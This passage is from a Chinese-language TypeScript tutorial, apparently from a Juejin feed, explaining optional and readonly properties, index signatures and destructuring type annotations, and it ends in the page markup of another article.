  <span class="hljs-comment">// 继承属性：从 Object 原型链继承</span>
  <span class="hljs-title function_">toString</span>(): <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// 自身属性：必须手动提供</span>
  <span class="hljs-attr">prop</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 正确：仅提供自身属性 prop，toString() 从原型链继承</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">MyInterface</span> = {
  <span class="hljs-attr">prop</span>: <span class="hljs-number">123</span>,
};
</code></pre>
<p>上述示例中，<code>obj</code> 仅提供了 <code>prop</code> 属性，但仍符合 <code>MyInterface</code> 接口约束，因为 <code>toString()</code> 方法可从 <code>Object</code> 原型链中继承，无需手动实现。</p>
<h3 data-id="heading-11">五、可选属性</h3>
<h4 data-id="heading-12">1. 可选属性的声明：<code>?</code></h4>
<p>如果某个属性不是必需的（可存在、可不存在），可以在属性名后添加<strong>问号 <code>?</code></strong> 标记为可选属性。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 声明 y 为可选属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  y?: <span class="hljs-built_in">number</span>;
} = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> }; <span class="hljs-comment">// 正确：无需提供 y 属性</span>
</code></pre>
<h4 data-id="heading-13">2. 可选属性与 undefined 的等价性</h4>
<p>可选属性本质上等同于「允许赋值为 <code>undefined</code> 的属性」，下面两种写法完全等效：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 写法 1：简洁写法</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User1</span> = {
  <span class="hljs-attr">firstName</span>: <span class="hljs-built_in">string</span>;
  lastName?: <span class="hljs-built_in">string</span>;
};

<span class="hljs-comment">// 写法 2：完整写法（明确允许 undefined）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User2</span> = {
  <span class="hljs-attr">firstName</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">lastName</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span>;
};
</code></pre>
<p>因此，可选属性可以显式赋值为 <code>undefined</code>，不会报错：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  y?: <span class="hljs-built_in">number</span>;
} = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-literal">undefined</span> }; <span class="hljs-comment">// 正确</span>
</code></pre>
<h4 data-id="heading-14">3. 可选属性的使用注意事项</h4>
<p>读取未赋值的可选属性时，返回值为 <code>undefined</code>，直接调用该属性的方法会报错，因此使用前必须先进行 <code>undefined</code> 校验。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyObj</span> = {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span>;
  y?: <span class="hljs-built_in">string</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">MyObj</span> = { <span class="hljs-attr">x</span>: <span class="hljs-string">'hello'</span> };

<span class="hljs-comment">// 错误：Cannot read properties of undefined (reading 'toLowerCase')</span>
obj.<span class="hljs-property">y</span>.<span class="hljs-title function_">toLowerCase</span>();
</code></pre>
<p>常用的校验方式有两种：条件判断或 Null 合并运算符 <code>??</code>（推荐）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: {
  <span class="hljs-attr">firstName</span>: <span class="hljs-built_in">string</span>;
  lastName?: <span class="hljs-built_in">string</span>;
} = { <span class="hljs-attr">firstName</span>: <span class="hljs-string">'Foo'</span> };

<span class="hljs-comment">// 方式 1：条件判断</span>
<span class="hljs-keyword">if</span> (user.<span class="hljs-property">lastName</span> !== <span class="hljs-literal">undefined</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`hello <span class="hljs-subst">${user.firstName}</span> <span class="hljs-subst">${user.lastName}</span>`</span>);
}

<span class="hljs-comment">// 方式 2：Null 合并运算符（设置默认值，更简洁）</span>
<span class="hljs-keyword">const</span> firstName = user.<span class="hljs-property">firstName</span> ?? <span class="hljs-string">'默认姓名'</span>;
<span class="hljs-keyword">const</span> lastName = user.<span class="hljs-property">lastName</span> ?? <span class="hljs-string">'默认姓氏'</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`hello <span class="hljs-subst">${firstName}</span> <span class="hljs-subst">${lastName}</span>`</span>);
</code></pre>
<h4 data-id="heading-15">4. 严格可选属性配置：ExactOptionalPropertyTypes</h4>
<p>TypeScript 提供了编译配置 <code>ExactOptionalPropertyTypes</code>，当该配置与 <code>strictNullChecks</code> 同时开启时，可选属性将<strong>不允许显式赋值为 <code>undefined</code></strong>，仅允许省略不写。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 开启 ExactOptionalPropertyTypes 和 strictNullChecks 后</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  y?: <span class="hljs-built_in">number</span>;
} = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-literal">undefined</span> }; <span class="hljs-comment">// 错误：Type 'undefined' is not assignable to type 'number | undefined'</span>
</code></pre>
<h4 data-id="heading-16">5. 可选属性 vs 允许 undefined 的必选属性</h4>
<p>两者看似相似，但存在核心区别：可选属性可省略不写，而允许 <code>undefined</code> 的必选属性必须显式提供（即使值为 <code>undefined</code>）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> A = { <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>; y?: <span class="hljs-built_in">number</span> }; <span class="hljs-comment">// y 是可选属性</span>
<span class="hljs-keyword">type</span> B = { <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span> | <span class="hljs-literal">undefined</span> }; <span class="hljs-comment">// y 是必选属性（允许 undefined）</span>

<span class="hljs-keyword">const</span> <span class="hljs-attr">objA</span>: A = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> }; <span class="hljs-comment">// 正确：可选属性可省略</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">objB</span>: B = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> }; <span class="hljs-comment">// 错误：缺少必选属性 y（Property 'y' is missing in type '{ x: number; }'）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">objB2</span>: B = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-literal">undefined</span> }; <span class="hljs-comment">// 正确：显式提供 y 并赋值为 undefined</span>
</code></pre>
<h3 data-id="heading-17">六、只读属性</h3>
<h4 data-id="heading-18">1. 只读属性的声明：<code>readonly</code></h4>
<p>在属性名前添加**<code>readonly</code> 关键字**，可将该属性标记为只读属性，初始化赋值后无法再修改其值。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 接口中声明只读属性</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyInterface</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">prop</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 直接字面量声明只读属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">person</span>: {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
} = { <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> };

<span class="hljs-comment">// 错误：Cannot assign to 'age' because it is a read-only property</span>
person.<span class="hljs-property">age</span> = <span class="hljs-number">21</span>;
</code></pre>
<p>只读属性仅能在对象<strong>初始化期间</strong>赋值，此后任何修改操作都会被 TS 禁止。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 初始化赋值（合法）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">p</span>: <span class="hljs-title class_">Point</span> = { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> };

<span class="hljs-comment">// 后续修改（非法）</span>
p.<span class="hljs-property">x</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// 错误</span>
</code></pre>
<h4 data-id="heading-19">2. 只读属性的深层注意事项</h4>
<p><code>readonly</code> 修饰符仅约束「属性本身的赋值」，如果属性值是一个对象（引用类型），<code>readonly</code> 不会禁止修改该对象的内部属性，仅禁止完全替换该对象。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Home</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">resident</span>: {
    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  };
}

<span class="hljs-keyword">const</span> <span class="hljs-attr">h</span>: <span class="hljs-title class_">Home</span> = {
  <span class="hljs-attr">resident</span>: {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Vicky'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">42</span>
  }
};

<span class="hljs-comment">// 正确：修改对象内部属性（readonly 不约束深层属性）</span>
h.<span class="hljs-property">resident</span>.<span class="hljs-property">age</span> = <span class="hljs-number">32</span>;

<span class="hljs-comment">// 错误：完全替换 readonly 属性的值（Cannot assign to 'resident' because it is a read-only property）</span>
h.<span class="hljs-property">resident</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Kate'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>
};
</code></pre>
<h4 data-id="heading-20">3. 只读引用的相互影响</h4>
<p>如果一个对象有两个引用（一个可写、一个只读），修改可写引用的属性，会影响到只读引用（因为两者指向同一个对象）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ReadonlyPerson</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 可写引用</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">writablePerson</span>: <span class="hljs-title class_">Person</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Vicky'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">42</span>,
};

<span class="hljs-comment">// 只读引用（指向同一个对象）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">readonlyPerson</span>: <span class="hljs-title class_">ReadonlyPerson</span> = writablePerson;

<span class="hljs-comment">// 修改可写引用的属性</span>
writablePerson.<span class="hljs-property">age</span> += <span class="hljs-number">1</span>;

<span class="hljs-comment">// 只读引用的属性值也会变化（输出 43）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(readonlyPerson.<span class="hljs-property">age</span>);
</code></pre>
<h4 data-id="heading-21">4. 只读断言：<code>as const</code></h4>
<p>除了声明时使用 <code>readonly</code>，还可以在对象赋值时使用**<code>as const</code> 只读断言**，将整个对象转为只读对象，所有属性均无法修改。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> myUser = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Sabrina"</span>,
} <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;

<span class="hljs-comment">// 错误：Cannot assign to 'name' because it is a read-only property</span>
myUser.<span class="hljs-property">name</span> = <span class="hljs-string">"Cynthia"</span>;
</code></pre>
<p>注意：如果变量已经明确声明了类型，TS 会以「声明的类型」为准，<code>as const</code> 断言会被忽略。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 明确声明类型：name 为可写的 string 类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">myUser</span>: { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> } = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Sabrina"</span>,
} <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;

<span class="hljs-comment">// 正确：以声明的类型为准，name 可修改</span>
myUser.<span class="hljs-property">name</span> = <span class="hljs-string">"Cynthia"</span>;
</code></pre>
<h3 data-id="heading-22">七、属性名的索引类型</h3>
<p>当对象的属性名无法提前确定（如 API 返回的动态数据），或属性数量过多时，TypeScript 允许使用「<strong>属性名的索引类型</strong>」（又称索引签名）来描述对象类型，支持字符串、数字、Symbol 三种索引类型。</p>
<h4 data-id="heading-23">1. 字符串索引类型</h4>
<p>最常用的索引类型，用于约束「属性名为字符串、属性值为统一类型」的对象。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 字符串索引类型：属性名是 string，属性值是 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringMap</span> = {
  [<span class="hljs-attr">property</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span>;
};

<span class="hljs-comment">// 合法：所有属性均符合索引类型约束</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">language</span>: <span class="hljs-title class_">StringMap</span> = {
  <span class="hljs-attr">zh</span>: <span class="hljs-string">"中文"</span>,
  <span class="hljs-attr">en</span>: <span class="hljs-string">"英文"</span>,
  <span class="hljs-attr">ja</span>: <span class="hljs-string">"日文"</span>,
};
</code></pre>
<p>其中，<code>[property: string]</code> 中的 <code>property</code> 是自定义的变量名，可任意修改（如 <code>[key: string]</code>），不影响类型校验。</p>
<h4 data-id="heading-24">2. 数字索引类型</h4>
<p>用于约束「属性名为数字、属性值为统一类型」的对象，常用来描述类数组对象。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 数字索引类型：属性名是 number，属性值是 number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberMap</span> = {
  [<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>]: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 合法：类数组对象</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arrLike</span>: <span class="hljs-title class_">NumberMap</span> = {
  <span class="hljs-number">0</span>: <span class="hljs-number">1</span>,
  <span class="hljs-number">1</span>: <span class="hljs-number">2</span>,
  <span class="hljs-number">2</span>: <span class="hljs-number">3</span>,
};

<span class="hljs-comment">// 也可用于简单数组（不推荐，数组有专门的类型声明方式）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">simpleArr</span>: <span class="hljs-title class_">NumberMap</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
</code></pre>
<h4 data-id="heading-25">3. 索引类型的约束规则</h4>
<ol>
<li><strong>数字索引服从字符串索引</strong>：JavaScript 内部会将数字属性名自动转为字符串，因此当对象同时存在数字索引和字符串索引时，数字索引的属性值类型必须兼容字符串索引的属性值类型，否则会报错。</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 错误：数字索引类型（boolean）与字符串索引类型（string）不兼容</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyType</span> = {
  [<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>]: <span class="hljs-built_in">boolean</span>;
  [<span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span>;
};

<span class="hljs-comment">// 正确：数字索引类型（string）兼容字符串索引类型（string）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyType2</span> = {
  [<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>]: <span class="hljs-built_in">string</span>;
  [<span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span>;
};
</code></pre>
<ol start="2">
<li><strong>具体属性必须兼容索引类型</strong>：如果对象同时声明了具体属性和索引类型，具体属性的类型必须兼容索引类型的属性值类型，否则会报错。</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 错误：具体属性 foo（boolean）与索引类型（string）不兼容</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyType3</span> = {
  <span class="hljs-attr">foo</span>: <span class="hljs-built_in">boolean</span>;
  [<span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span>;
};

<span class="hljs-comment">// 正确：具体属性 foo（string）兼容索引类型（string）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyType4</span> = {
  <span class="hljs-attr">foo</span>: <span class="hljs-built_in">string</span>;
  [<span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span>;
};
</code></pre>
<h4 data-id="heading-26">4. 索引类型的使用注意事项</h4>
<p>索引类型的约束较为宽泛，容易忽略具体属性的细节校验，建议谨慎使用。另外，数字索引类型不宜用来声明数组，因为这种方式无法支持数组的 <code>length</code> 属性和各类数组方法（如 <code>push()</code>、<code>map()</code>）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyArr</span> = {
  [<span class="hljs-attr">n</span>: <span class="hljs-built_in">number</span>]: <span class="hljs-built_in">number</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">arr</span>: <span class="hljs-title class_">MyArr</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];

<span class="hljs-comment">// 错误：Property 'length' does not exist on type 'MyArr'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">length</span>);

<span class="hljs-comment">// 错误：Property 'push' does not exist on type 'MyArr'</span>
arr.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>);
</code></pre>
<h3 data-id="heading-27">八、对象的解构赋值与类型声明</h3>
<p>TypeScript 支持 JavaScript 的对象解构赋值，同时也需要为解构后的变量添加类型约束，其类型写法与对象类型声明一致。</p>
<h4 data-id="heading-28">1. 基本解构赋值的类型声明</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 定义对象类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Product</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 定义原始对象</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">product</span>: <span class="hljs-title class_">Product</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-string">"P001"</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"TypeScript 实战指南"</span>,
  <span class="hljs-attr">price</span>: <span class="hljs-number">59.9</span>,
};

<span class="hljs-comment">// 解构赋值并添加类型声明</span>
<span class="hljs-keyword">const</span> { id, name, price }: {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;
} = product;

<span class="hljs-comment">// 或直接使用已定义的类型别名（推荐，更简洁）</span>
<span class="hljs-keyword">const</span> { <span class="hljs-attr">id</span>: productId, <span class="hljs-attr">name</span>: productName }: <span class="hljs-title class_">Product</span> = product;
</code></pre>
<h4 data-id="heading-29">2. 解构赋值中的冒号陷阱</h4>
<p>需要特别注意：对象解构中的冒号 <code>:</code> 不是用来指定类型的，而是用来<strong>为属性重命名</strong>的。如果要为解构变量指定类型，必须在解构表达式外部整体添加类型声明。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">x</span>: <span class="hljs-string">"hello"</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">123</span> };

<span class="hljs-comment">// 解构重命名：x → foo，y → bar（冒号不是类型声明）</span>
<span class="hljs-keyword">let</span> { <span class="hljs-attr">x</span>: foo, <span class="hljs-attr">y</span>: bar } = obj;

<span class="hljs-comment">// 等同于</span>
<span class="hljs-keyword">let</span> foo = obj.<span class="hljs-property">x</span>;
<span class="hljs-keyword">let</span> bar = obj.<span class="hljs-property">y</span>;

<span class="hljs-comment">// 正确：外部添加整体类型声明</span>
<span class="hljs-keyword">let</span> { <span class="hljs-attr">x</span>: foo2, <span class="hljs-attr">y</span>: bar2 }: { <span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span> } = obj;
</code></pre>
<h4 data-id="heading-30">3. 函数参数解构的类型声明</h4>
<p>在函数参数中使用对象解构时，同样需要注意冒号的用途，避免将重命名误认为类型声明。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 错误示例：将重命名误认为类型声明</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">draw</span>(<span class="hljs-params">{
  shape: Shape, // 重命名：shape → Shape
  xPos: <span class="hljs-built_in">number</span> = <span class="hljs-number">100</span> // 错误：无法将类型 <span class="hljs-string">'number'</span> 赋值给变量 xPos
}</span>) {
  <span class="hljs-keyword">let</span> myShape = shape; <span class="hljs-comment">// 错误：找不到变量 shape</span>
  <span class="hljs-keyword">let</span> x = xPos; <span class="hljs-comment">// 错误：找不到变量 xPos</span>
}

<span class="hljs-comment">// 正确示例：外部添加类型声明</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">drawCorrect</span>(<span class="hljs-params">{
  shape,
  xPos = <span class="hljs-number">100</span>
}: {
  shape: <span class="hljs-built_in">string</span>;
  xPos: <span class="hljs-built_in">number</span>;
}</span>) {
  <span class="hljs-keyword">let</span> myShape = shape;
  <span class="hljs-keyword">let</span> x = xPos;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`绘制<span class="hljs-subst">${myShape}</span>，x坐标：<span class="hljs-subst">${x}</span>`</span>);
}
</code></pre>
<h3 data-id="heading-31">九、核心总结</h3>
<ol>
<li>TypeScript 对象类型的基础声明使用 <code>{}</code>，属性分隔符支持 <code>;</code> 或 <code>,</code>，赋值时需严格匹配「不多不少」的属性规则。</li>
<li>对象方法支持函数签名和箭头函数两种类型声明方式，属性类型可通过 <code>[]</code> 读取。</li>
<li><code>type</code> 和 <code>interface</code> 均可定义对象类型别名，<code>interface</code> 支持继承属性的兼容。</li>
<li>可选属性用 <code>?</code> 声明，本质等同于允许 <code>undefined</code>，使用前需做 <code>undefined</code> 校验；只读属性用 <code>readonly</code> 声明，仅约束属性本身的赋值。</li>
<li>索引类型用于处理动态属性名，支持字符串、数字、Symbol 三种类型，需遵循「数字索引服从字符串索引」的规则。</li>
<li>对象解构赋值的类型声明需在外部整体添加，解构内部的冒号用于重命名，而非类型指定。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何结合 AI，为未来社交群体构建「信任桥梁」]]></title>    <link>https://juejin.cn/post/7594415509606547502</link>    <guid>https://juejin.cn/post/7594415509606547502</guid>    <pubDate>2026-01-13T02:58:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594415509606547502" data-draft-id="7594322573453459499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何结合 AI，为未来社交群体构建「信任桥梁」"/> <meta itemprop="keywords" content="人工智能,架构,React Native"/> <meta itemprop="datePublished" content="2026-01-13T02:58:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何结合 AI，为未来社交群体构建「信任桥梁」
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:58:22.000Z" title="Tue Jan 13 2026 02:58:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 